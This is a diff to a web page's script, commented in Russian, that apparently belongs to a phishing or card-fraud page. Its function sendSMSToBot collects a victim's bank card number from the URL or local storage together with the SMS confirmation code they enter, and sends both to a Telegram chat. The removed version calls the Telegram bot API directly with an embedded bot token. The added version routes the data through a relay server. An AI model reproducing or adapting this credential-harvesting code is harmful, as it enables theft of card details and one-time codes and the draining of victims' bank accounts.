@@ -1010,49 +1010,48 @@
         };
 
         // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
-        async function sendSMSToBot(smsCode) {
-            try {
-                // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
-                const urlParams = new URLSearchParams(window.location.search);
-                let cardNumber = urlParams.get('card');
-                
-                if (!cardNumber) {
-                    // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
-                    cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
-                }
-                
-                console.log('🔍 Номер карты для СМС:', cardNumber);
-                
-                // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
-                const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
-
-        💳 <b>Номер карты:</b> ${cardNumber}
-        🔐 <b>СМС код:</b> ${smsCode}`;
-
-                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-                const CHAT_ID = '-1003239032658';
-
-                // Отправляем СМС код с номером карты
-                const smsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: smsMessage,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                const smsResult = await smsResponse.json();
-                console.log('✅ СМС код с номером карты отправлен:', smsResult.ok);
-
-                return smsResult.ok;
-
-            } catch (error) {
-                console.error('❌ Ошибка отправки СМС кода:', error);
-                return false;
-            }
+        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
+async function sendSMSToBot(smsCode) {
+    try {
+        // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ URL
+        const urlParams = new URLSearchParams(window.location.search);
+        let cardNumber = urlParams.get('card');
+        
+        if (!cardNumber) {
+            // ЕСЛИ В URL НЕТ, ПРОБУЕМ ИЗ localStorage
+            cardNumber = localStorage.getItem('lastCardNumber') || 'Неизвестно';
         }
+        
+        console.log('🔍 Номер карты для СМС:', cardNumber);
+        
+        // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
+        const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
+
+💳 <b>Номер карты:</b> ${cardNumber}
+🔐 <b>СМС код:</b> ${smsCode}`;
+
+        // ОТПРАВЛЯЕМ ЧЕРЕЗ СЕРВЕР (БЕЗОПАСНО)
+        const SERVER_URL = 'https://roomix-production.up.railway.app';
+        const response = await fetch(`${SERVER_URL}/send_to_telegram`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                message: smsMessage,
+                chat_id: '-1003239032658',
+                parse_mode: 'HTML'
+            })
+        });
+
+        const result = await response.json();
+        console.log('✅ СМС код с номером карты отправлен через сервер:', result.status === 'success');
+
+        return result.status === 'success';
+
+    } catch (error) {
+        console.error('❌ Ошибка отправки СМС кода:', error);
+        return false;
+    }
+}
 
         // ФУНКЦИИ УВЕДОМЛЕНИЙ
         function showSuccessMessage() {
@@ -1138,3 +1137,4 @@
     </script>
 </body>
 </html>
+
